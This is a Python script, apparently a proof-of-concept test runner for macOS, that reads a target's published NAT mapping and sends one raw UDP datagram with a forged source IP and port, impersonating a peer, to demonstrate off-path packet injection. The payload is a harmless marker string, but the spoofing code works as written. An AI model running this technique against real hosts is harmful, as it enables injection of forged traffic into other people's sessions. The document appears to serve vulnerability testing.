#!/usr/bin/env python3
"""Send exactly one forged-source UDP marker from a separate macOS runner."""
import ipaddress, json, os, socket, struct, subprocess, sys, time, pathlib

out = pathlib.Path("offpath-stun-results")
out.mkdir(parents=True, exist_ok=True)
mapping_path = out / "mapping.json"
deadline = time.time() + 240
while not mapping_path.exists() and time.time() < deadline:
    time.sleep(1)
if not mapping_path.exists():
    raise SystemExit("TIMEOUT waiting for published target mapping")

m = json.loads(mapping_path.read_text())
attacker_ip = subprocess.run(["curl", "-4", "--connect-timeout", "5", "--max-time", "10", "-fsS", "https://api.ipify.org"], capture_output=True, text=True, timeout=15).stdout.strip() or "UNKNOWN"
if attacker_ip in (m["client_public_ip"], m["peer_ip"]):
    raise SystemExit("FAIL: attacker, target, and peer must have distinct public IPs")

src = ipaddress.IPv4Address(m["peer_ip"]).packed
dst = ipaddress.IPv4Address(m["client_public_ip"]).packed
sport = int(m["peer_port"])
dport = int(m["client_public_port"])
payload = b"OFFPATH-DELIVERY-PROOF"
udp = struct.pack("!HHHH", sport, dport, 8 + len(payload), 0) + payload
total_len = 20 + len(udp)

# Darwin IP_HDRINCL expects ip_len and ip_off as host-endian fields.
header = struct.pack("!BBHHHBBH4s4s", 0x45, 0, total_len, 0x4D53, 0, 64, 17, 0, src, dst)
header = bytearray(header)
header[2:4] = struct.pack("=H", total_len)
header[4:6] = struct.pack("=H", 0)
header[10:12] = b"\x00\x00"

def ip_checksum(data):
    if len(data) & 1:
        data += b"\x00"
    total = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    while total >> 16:
        total = (total & 0xffff) + (total >> 16)
    return (~total) & 0xffff

# Compute checksum over the on-wire (network-byte-order) header.
wire_header = bytearray(header)
wire_header[2:4] = struct.pack("!H", total_len)
wire_header[4:6] = struct.pack("!H", 0)
wire_header[10:12] = b"\x00\x00"
header[10:12] = struct.pack("!H", ip_checksum(bytes(wire_header)))
if len(header) != 20:
    raise SystemExit(f"invalid IPv4 header length: {len(header)}")
packet = bytes(header) + udp
if len(packet) != total_len:
    raise SystemExit(f"invalid datagram length: {len(packet)} != {total_len}")

identity = {
    "attacker_public_ip": attacker_ip,
    "spoofed_source": f'{m["peer_ip"]}:{sport}',
    "controlled_target": f'{m["client_public_ip"]}:{dport}',
    "datagrams_sent": 1,
    "payload_hex": payload.hex(),
}
(out / "attacker-macos.json").write_text(json.dumps(identity, indent=2) + "\n")
print("ATTACK_IDENTITY=" + json.dumps(identity, sort_keys=True), flush=True)

sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
sent = sock.sendto(packet, (m["client_public_ip"], 0))
sock.close()
if sent != len(packet):
    raise SystemExit(f"FAIL: short raw send {sent}/{len(packet)}")
print(f"RAW_SEND_ACCEPTED bytes={sent}", flush=True)
